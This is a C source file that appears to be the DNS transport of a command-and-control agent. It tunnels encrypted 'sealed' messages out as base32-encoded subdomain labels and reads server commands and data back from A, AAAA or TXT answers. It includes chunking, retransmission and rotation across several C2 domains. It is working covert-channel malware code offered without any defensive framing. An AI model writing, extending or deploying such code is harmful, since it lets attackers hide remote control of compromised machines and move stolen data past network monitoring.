#include "common.h"
#include "crypto.h"
#include "dns.h"
#include "sock.h"

#define DNS_A_AGENT 0
#define DNS_A_SERVER 1
#define DNS_A_RETRANS 2
#define DNS_A_LOST 3

static int put_varint(unsigned char **p, size_t *room, unsigned v) {
    do {
        unsigned char b = (unsigned char)(v & 0x7F);
        v >>= 7;
        if (v)
            b |= 0x80;
        if (*room < 1)
            return -1;
        **p = b;
        (*p)++;
        (*room)--;
    } while (v);
    return 0;
}

int dns_marshal(const dns_pkt_t *p, bytebuf_t *out) {
    unsigned char *buf = (unsigned char *)malloc(p->data_len + 32);
    unsigned char *w;
    size_t room;
    out->data = NULL;
    out->len = 0;
    if (!buf)
        return -1;
    w = buf;
    room = p->data_len + 32;
    if (p->action && (put_varint(&w, &room, 0x08) || put_varint(&w, &room, p->action)))
        goto fail;
    if (p->session && (put_varint(&w, &room, 0x10) || put_varint(&w, &room, p->session)))
        goto fail;
    if (p->msgid && (put_varint(&w, &room, 0x18) || put_varint(&w, &room, p->msgid)))
        goto fail;
    if (p->total && (put_varint(&w, &room, 0x20) || put_varint(&w, &room, p->total)))
        goto fail;
    if (p->current && (put_varint(&w, &room, 0x28) || put_varint(&w, &room, p->current)))
        goto fail;
    if (p->data_len) {
        if (put_varint(&w, &room, 0x32) || put_varint(&w, &room, (unsigned)p->data_len))
            goto fail;
        if (room < p->data_len)
            goto fail;
        memcpy(w, p->data, p->data_len);
        w += p->data_len;
        room -= p->data_len;
    }
    out->data = buf;
    out->len = (size_t)(w - buf);
    return 0;
fail:
    free(buf);
    return -1;
}

static int get_varint(const unsigned char **p, size_t *left, unsigned *v) {
    unsigned shift = 0;
    *v = 0;
    for (;;) {
        unsigned char c;
        if (*left < 1)
            return -1;
        c = **p;
        (*p)++;
        (*left)--;
        *v |= (unsigned)(c & 0x7F) << shift;
        if (!(c & 0x80))
            return 0;
        shift += 7;
        if (shift > 35)
            return -1;
    }
}

int dns_unmarshal(const unsigned char *b, size_t n, dns_pkt_t *out, bytebuf_t *data_out) {
    memset(out, 0, sizeof(*out));
    data_out->data = NULL;
    data_out->len = 0;
    while (n > 0) {
        unsigned tag = *b, field, wire, v = 0, len = 0;
        b++;
        n--;
        field = tag >> 3;
        wire = tag & 0x07;
        if (wire == 0) {
            if (get_varint(&b, &n, &v) != 0)
                goto fail;
            switch (field) {
            case 1:
                out->action = v;
                break;
            case 2:
                out->session = v;
                break;
            case 3:
                out->msgid = v;
                break;
            case 4:
                out->total = v;
                break;
            case 5:
                out->current = v;
                break;
            }
        } else if (wire == 2) {
            if (get_varint(&b, &n, &len) != 0 || len > n)
                goto fail;
            if (field == 6) {
                data_out->data = (unsigned char *)malloc(len + 1);
                if (!data_out->data)
                    goto fail;
                memcpy(data_out->data, b, len);
                data_out->data[len] = '\0';
                data_out->len = len;
                out->data = data_out->data;
                out->data_len = len;
            }
            b += len;
            n -= len;
        } else {
            goto fail;
        }
    }
    return 0;
fail:
    bytebuf_free(data_out);
    return -1;
}

static const char b32_table[] = "abcdefghijklmnopqrstuvwxyz234567";

char *b32_encode(const unsigned char *in, size_t len) {
    size_t out_len = (len * 8 + 4) / 5;
    char *dst = (char *)malloc(out_len + 1);
    size_t i, j = 0;
    unsigned acc = 0;
    int bits = 0;
    if (!dst)
        return NULL;
    for (i = 0; i < len; i++) {
        acc = (acc << 8) | in[i];
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            dst[j++] = b32_table[(acc >> bits) & 0x1F];
        }
    }
    if (bits > 0)
        dst[j++] = b32_table[(acc << (5 - bits)) & 0x1F];
    dst[j] = '\0';
    return dst;
}

int dns_build_query(const agent_config_t *cfg, const char *domain,
                    const unsigned char *pkt, size_t pkt_len,
                    char *qname, size_t cap) {
    char *b32 = b32_encode(pkt, pkt_len);
    size_t pos = 0, off = 0, blen, llen = (size_t)cfg->dns_max_sub;
    int maxq = cfg->dns_max_query > 0 ? cfg->dns_max_query : 255;
    if (!b32)
        return -1;
    if (llen > 63)
        llen = 63;
    if (llen < 1)
        llen = 1;
    blen = strlen(b32);
    while (off < blen) {
        size_t n = blen - off > llen ? llen : blen - off;
        if (pos + n + 1 >= cap) {
            free(b32);
            return -1;
        }
        memcpy(qname + pos, b32 + off, n);
        pos += n;
        off += n;
        qname[pos++] = '.';
    }
    free(b32);
    if (pos + strlen(domain) + 1 > cap)
        return -1;
    memcpy(qname + pos, domain, strlen(domain) + 1);
    if ((int)strlen(qname) > maxq)
        return -1;
    return 0;
}

/* Split "ip:port" (port defaults to 53). */
static void split_server(const char *in, char *ip, size_t ipcap, char *port, size_t portcap) {
    const char *colon = strrchr(in, ':');
    if (colon && colon[1] != '\0') {
        size_t n = (size_t)(colon - in);
        if (n >= ipcap)
            n = ipcap - 1;
        memcpy(ip, in, n);
        ip[n] = '\0';
        strncpy(port, colon + 1, portcap - 1);
        port[portcap - 1] = '\0';
    } else {
        strncpy(ip, in, ipcap - 1);
        ip[ipcap - 1] = '\0';
        strncpy(port, "53", portcap - 1);
        port[portcap - 1] = '\0';
    }
}

static unsigned qtype_of(const char *rec) {
    if (!rec || rec[0] == '\0' || strcmp(rec, "A") == 0)
        return 1;
    if (strcmp(rec, "AAAA") == 0)
        return 28;
    if (strcmp(rec, "TXT") == 0)
        return 16;
    return 0;
}

typedef struct {
    unsigned char *rdata;
    size_t rdlen;
    char *txt; /* TXT records joined */
} dns_ans_t;

static void answers_free(dns_ans_t *a, int n) {
    int i;
    for (i = 0; i < n; i++) {
        free(a[i].rdata);
        free(a[i].txt);
    }
    free(a);
}

static int skip_name(const unsigned char *b, size_t len, size_t *off) {
    for (;;) {
        unsigned char c;
        if (*off >= len)
            return -1;
        c = b[*off];
        if ((c & 0xC0) == 0xC0) {
            *off += 2;
            return 0;
        }
        if (c == 0) {
            *off += 1;
            return 0;
        }
        *off += 1 + c;
    }
}

/* One UDP query; parses answers of qtype into malloc'd array. */
static int dns_query(const char *server, const char *qname, unsigned qtype,
                     dns_ans_t **answers, int *nanswers) {
    char ip[64], port[16];
    SOCKET s = INVALID_SOCKET;
    unsigned char *query = NULL, resp[4096];
    size_t qlen, off;
    int n, qd, an, i, rc = -1;
    unsigned id = ((unsigned)rand() << 16) ^ (unsigned)rand();
    const char *p;
    *answers = NULL;
    *nanswers = 0;
    split_server(server, ip, sizeof(ip), port, sizeof(port));
    qlen = 12 + strlen(qname) + 2 + 4;
    query = (unsigned char *)malloc(qlen);
    if (!query)
        return -1;
    query[0] = (unsigned char)(id >> 8);
    query[1] = (unsigned char)id;
    memcpy(query + 2, "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00", 10);
    off = 12;
    for (p = qname; *p;) {
        const char *dot = strchr(p, '.');
        size_t nlen = dot ? (size_t)(dot - p) : strlen(p);
        if (nlen == 0 || nlen > 63) {
            free(query);
            return -1;
        }
        query[off++] = (unsigned char)nlen;
        memcpy(query + off, p, nlen);
        off += nlen;
        p += nlen + (dot ? 1 : 0);
    }
    query[off++] = 0;
    query[off++] = (unsigned char)(qtype >> 8);
    query[off++] = (unsigned char)qtype;
    query[off++] = 0;
    query[off++] = 1;
    if (sock_udp(ip, port, &s) != 0) {
        free(query);
        return -1;
    }
    if (sock_send_all(s, query, off) != 0)
        goto done;
    n = recv(s, (char *)resp, sizeof(resp), 0);
    if (n < 12)
        goto done;
    if (((unsigned)resp[0] << 8 | resp[1]) != (id & 0xFFFF))
        goto done;
    if ((resp[3] & 0x0F) != 0)
        goto done;
    qd = (resp[4] << 8) | resp[5];
    an = (resp[6] << 8) | resp[7];
    off = 12;
    for (i = 0; i < qd; i++) {
        if (skip_name(resp, (size_t)n, &off) != 0)
            goto done;
        off += 4;
    }
    {
        dns_ans_t *arr = (dns_ans_t *)calloc(an > 0 ? (size_t)an : 1, sizeof(dns_ans_t));
        int kept = 0;
        if (!arr)
            goto done;
        for (i = 0; i < an; i++) {
            unsigned typ, rdlen;
            if (skip_name(resp, (size_t)n, &off) != 0) {
                answers_free(arr, kept);
                goto done;
            }
            if (off + 10 > (size_t)n) {
                answers_free(arr, kept);
                goto done;
            }
            typ = ((unsigned)resp[off] << 8) | resp[off + 1];
            rdlen = ((unsigned)resp[off + 8] << 8) | resp[off + 9];
            off += 10;
            if (off + rdlen > (size_t)n) {
                answers_free(arr, kept);
                goto done;
            }
            if (typ == qtype) {
                if (qtype == 16) {
                    size_t roff = 0, tlen = 0, tcap = rdlen + 1;
                    char *txt = (char *)malloc(tcap);
                    if (!txt) {
                        answers_free(arr, kept);
                        goto done;
                    }
                    while (roff < rdlen) {
                        unsigned slen = resp[off + roff++];
                        if (roff + slen > rdlen) {
                            free(txt);
                            answers_free(arr, kept);
                            goto done;
                        }
                        if (tlen + slen + 1 > tcap) {
                            free(txt);
                            answers_free(arr, kept);
                            goto done;
                        }
                        memcpy(txt + tlen, resp + off + roff, slen);
                        tlen += slen;
                        roff += slen;
                    }
                    txt[tlen] = '\0';
                    arr[kept++].txt = txt;
                } else {
                    arr[kept].rdata = (unsigned char *)malloc(rdlen ? rdlen : 1);
                    if (!arr[kept].rdata) {
                        answers_free(arr, kept);
                        goto done;
                    }
                    memcpy(arr[kept].rdata, resp + off, rdlen);
                    arr[kept].rdlen = rdlen;
                    kept++;
                }
            }
            off += rdlen;
        }
        *answers = arr;
        *nanswers = kept;
    }
    rc = 0;
done:
    free(query);
    sock_close(s);
    return rc;
}

static int action_of(const dns_ans_t *a, unsigned qtype, unsigned *action) {
    if (qtype == 1) {
        if (a->rdlen != 4)
            return -1;
        *action = a->rdata[3];
        return 0;
    }
    if (qtype == 28) {
        if (a->rdlen != 16)
            return -1;
        *action = a->rdata[15];
        return 0;
    }
    if (qtype == 16) {
        if (!a->txt || a->txt[0] < '0' || a->txt[0] > '9')
            return -1;
        *action = (unsigned)atoi(a->txt);
        return 0;
    }
    return -1;
}

/* Reassemble one marshalled packet from post-action answers. */
static int packet_of(const dns_ans_t *a, int n, unsigned qtype, bytebuf_t *out) {
    out->data = NULL;
    out->len = 0;
    if (qtype == 1 || qtype == 28) {
        size_t want = qtype == 1 ? 4 : 16, total = 0;
        unsigned char *raw, *slots[256];
        int i, max = 0;
        memset(slots, 0, sizeof(slots));
        for (i = 0; i < n; i++) {
            unsigned ord;
            if (a[i].rdlen != want || !a[i].rdata)
                return -1;
            ord = a[i].rdata[0];
            if (ord < 1 || ord > 255 || slots[ord])
                return -1;
            slots[ord] = a[i].rdata + 1;
            total += want - 1;
            if ((int)ord > max)
                max = (int)ord;
        }
        if (max != n || total == 0)
            return -1;
        raw = (unsigned char *)malloc(total);
        if (!raw)
            return -1;
        total = 0;
        for (i = 1; i <= max; i++) {
            memcpy(raw + total, slots[i], want - 1);
            total += want - 1;
        }
        {
            unsigned pad = raw[total - 1];
            if (pad < 1 || pad > want - 1 || pad > total) {
                free(raw);
                return -1;
            }
            total -= pad;
        }
        out->data = raw;
        out->len = total;
        return 0;
    }
    if (qtype == 16) {
        size_t jlen = 0;
        char *joined;
        int i;
        for (i = 0; i < n; i++)
            jlen += a[i].txt ? strlen(a[i].txt) : 0;
        joined = (char *)malloc(jlen + 1);
        if (!joined)
            return -1;
        joined[0] = '\0';
        for (i = 0; i < n; i++)
            if (a[i].txt)
                strcat(joined, a[i].txt);
        out->data = b64_decode(joined, &out->len);
        free(joined);
        return out->data ? 0 : -1;
    }
    return -1;
}

static void rotate(const agent_config_t *cfg, dns_state_t *st, int ok) {
    int count = cfg->dns_domain_count > 0 ? cfg->dns_domain_count : 1;
    if (strcmp(cfg->dns_rotation, "round-robin") == 0) {
        st->idx = (st->idx + 1) % count;
    } else if (strcmp(cfg->dns_rotation, "random") == 0) {
        st->idx = rand() % count;
    } else {
        int threshold = cfg->dns_failover > 0 ? cfg->dns_failover : 5;
        if (ok) {
            st->fails = 0;
            return;
        }
        if (++st->fails >= threshold) {
            st->fails = 0;
            st->idx = (st->idx + 1) % count;
        }
    }
}

/* One packet round trip: action plus packet-carrying answers. */
static int round_trip(const agent_config_t *cfg, dns_state_t *st, unsigned qtype,
                      const unsigned char *pkt, size_t pkt_len,
                      unsigned *action, dns_ans_t **rest, int *nrest) {
    char qname[512];
    int attempt;
    *rest = NULL;
    *nrest = 0;
    if (dns_build_query(cfg, cfg->dns_domains[st->idx % cfg->dns_domain_count],
                        pkt, pkt_len, qname, sizeof(qname)) != 0)
        return -1;
    for (attempt = 0; attempt < 2; attempt++) {
        dns_ans_t *answers = NULL;
        int n = 0, i;
        if (dns_query(cfg->dns_server, qname, qtype, &answers, &n) != 0)
            continue;
        if (n < 1 || action_of(&answers[0], qtype, action) != 0) {
            answers_free(answers, n);
            continue;
        }
        *rest = (dns_ans_t *)calloc(n > 1 ? (size_t)(n - 1) : 1, sizeof(dns_ans_t));
        if (!*rest) {
            answers_free(answers, n);
            return -1;
        }
        for (i = 1; i < n; i++)
            (*rest)[i - 1] = answers[i];
        *nrest = n - 1;
        free(answers[0].rdata);
        free(answers[0].txt);
        free(answers);
        return 0;
    }
    return -1;
}

/* Cut sealed bytes into per-query Data payloads (verified sizes). */
static int split_data(const agent_config_t *cfg, dns_state_t *st, unsigned msgid,
                      const unsigned char *sealed, size_t sealed_len,
                      unsigned char ***chunks, size_t **lens, int *nchunks) {
    const char *domain = cfg->dns_domains[st->idx % cfg->dns_domain_count];
    int maxq = cfg->dns_max_query > 0 ? cfg->dns_max_query : 255;
    size_t llen = cfg->dns_max_sub > 0 ? (size_t)cfg->dns_max_sub : 64;
    int avail, labels, iter;
    size_t step;
    bytebuf_t hdr = {0};
    dns_pkt_t hp;
    *chunks = NULL;
    *lens = NULL;
    *nchunks = 0;
    avail = maxq - (int)strlen(domain) - 1;
    if (avail < 16)
        return -1;
    if (llen > 63)
        llen = 63;
    labels = (avail + 1) / ((int)llen + 1);
    if (labels < 1)
        labels = 1;
    memset(&hp, 0, sizeof(hp));
    hp.session = st->session;
    hp.msgid = msgid;
    hp.total = 0xFFFFFFFF;
    hp.current = 0xFFFFFFFF;
    if (dns_marshal(&hp, &hdr) != 0)
        return -1;
    step = (size_t)labels * llen * 5 / 8;
    if (step > hdr.len + 1)
        step -= hdr.len + 1;
    else
        step = 0;
    bytebuf_free(&hdr);
    for (iter = 0; iter < 8 && step > 0; iter++) {
        unsigned char **ch;
        size_t *ln;
        int n, i, fits = 1;
        n = (int)((sealed_len + step - 1) / step);
        if (n < 1)
            n = 1;
        ch = (unsigned char **)calloc((size_t)n, sizeof(*ch));
        ln = (size_t *)calloc((size_t)n, sizeof(*ln));
        if (!ch || !ln) {
            free(ch);
            free(ln);
            return -1;
        }
        for (i = 0; i < n; i++) {
            size_t off = (size_t)i * step;
            ln[i] = sealed_len - off > step ? step : sealed_len - off;
            ch[i] = (unsigned char *)sealed + off;
        }
        for (i = 0; i < n && fits; i++) {
            dns_pkt_t p;
            bytebuf_t pkt = {0};
            char qname[512];
            memset(&p, 0, sizeof(p));
            p.session = st->session;
            p.msgid = msgid;
            p.total = (unsigned)n;
            p.current = (unsigned)i;
            p.data = ch[i];
            p.data_len = ln[i];
            if (dns_marshal(&p, &pkt) != 0 ||
                dns_build_query(cfg, domain, pkt.data, pkt.len, qname, sizeof(qname)) != 0)
                fits = 0;
            bytebuf_free(&pkt);
        }
        if (fits) {
            *chunks = ch;
            *lens = ln;
            *nchunks = n;
            return 0;
        }
        free(ch);
        free(ln);
        step = step * 3 / 4;
    }
    return -1;
}

int dns_exchange(const agent_config_t *cfg, dns_state_t *st,
                 const unsigned char *sealed, size_t sealed_len,
                 unsigned char **out, size_t *out_len) {
    unsigned qtype, msgid, action;
    unsigned char **chunks = NULL;
    size_t *lens = NULL;
    int nchunks = 0, attempt, i, rc = -1;
    unsigned char *reply = NULL;
    size_t reply_len = 0, reply_cap = 0;
    *out = NULL;
    *out_len = 0;
    if (cfg->dns_domain_count < 1)
        return -1;
    qtype = qtype_of(cfg->dns_record);
    if (!qtype)
        return -1;
    if (st->session == 0)
        st->session = ((unsigned)rand() << 16) ^ (unsigned)rand();
    msgid = ((unsigned)rand() << 16) ^ (unsigned)rand();
    if (split_data(cfg, st, msgid, sealed, sealed_len, &chunks, &lens, &nchunks) != 0)
        return -1;
    /* Upload. */
    for (attempt = 0; attempt < 3; attempt++) {
        int need_retrans = 0;
        for (i = 0; i < nchunks; i++) {
            dns_pkt_t p;
            bytebuf_t pkt = {0};
            dns_ans_t *rest = NULL;
            int nrest = 0;
            memset(&p, 0, sizeof(p));
            p.session = st->session;
            p.msgid = msgid;
            p.total = (unsigned)nchunks;
            p.current = (unsigned)i;
            p.data = chunks[i];
            p.data_len = lens[i];
            if (dns_marshal(&p, &pkt) != 0)
                goto done;
            rc = round_trip(cfg, st, qtype, pkt.data, pkt.len, &action, &rest, &nrest);
            bytebuf_free(&pkt);
            if (rest) {
                answers_free(rest, nrest);
                rest = NULL;
            }
            if (rc != 0)
                goto done;
            if (action == DNS_A_SERVER)
                break;
            if (action == DNS_A_RETRANS) {
                need_retrans = 1;
                break;
            }
            if (action != DNS_A_AGENT || i == nchunks - 1) {
                rc = -1;
                goto done;
            }
        }
        if (!need_retrans) {
            rc = 0;
            break;
        }
        rc = -1;
    }
    rotate(cfg, st, rc == 0);
    if (rc != 0)
        goto done;
    /* Download. */
    for (i = 0;; i++) {
        dns_pkt_t p, got;
        bytebuf_t pkt = {0}, praw = {0}, pdata = {0};
        dns_ans_t *rest = NULL;
        int nrest = 0;
        memset(&p, 0, sizeof(p));
        p.action = DNS_A_SERVER;
        p.session = st->session;
        p.msgid = msgid;
        p.current = (unsigned)i;
        if (dns_marshal(&p, &pkt) != 0) {
            rc = -1;
            break;
        }
        rc = round_trip(cfg, st, qtype, pkt.data, pkt.len, &action, &rest, &nrest);
        bytebuf_free(&pkt);
        if (rc != 0)
            break;
        if (action == DNS_A_LOST) {
            answers_free(rest, nrest);
            rc = -1;
            break;
        }
        if (action != DNS_A_SERVER) {
            answers_free(rest, nrest);
            rc = -1;
            break;
        }
        rc = packet_of(rest, nrest, qtype, &praw);
        answers_free(rest, nrest);
        if (rc != 0)
            break;
        rc = dns_unmarshal(praw.data, praw.len, &got, &pdata);
        bytebuf_free(&praw);
        if (rc != 0)
            break;
        if (got.current != (unsigned)i || got.total == 0) {
            bytebuf_free(&pdata);
            rc = -1;
            break;
        }
        if (reply_len + pdata.len > reply_cap) {
            size_t want = reply_len + pdata.len;
            unsigned char *grown = (unsigned char *)realloc(reply, want ? want : 1);
            if (!grown) {
                bytebuf_free(&pdata);
                rc = -1;
                break;
            }
            reply = grown;
            reply_cap = want;
        }
        memcpy(reply + reply_len, pdata.data, pdata.len);
        reply_len += pdata.len;
        bytebuf_free(&pdata);
        if ((unsigned)(i + 1) >= got.total) {
            rc = 0;
            break;
        }
    }
    rotate(cfg, st, rc == 0);
    if (rc != 0)
        goto done;
    *out = reply;
    *out_len = reply_len;
    reply = NULL;
    rc = 0;
done:
    free(chunks);
    free(lens);
    free(reply);
    return rc;
}
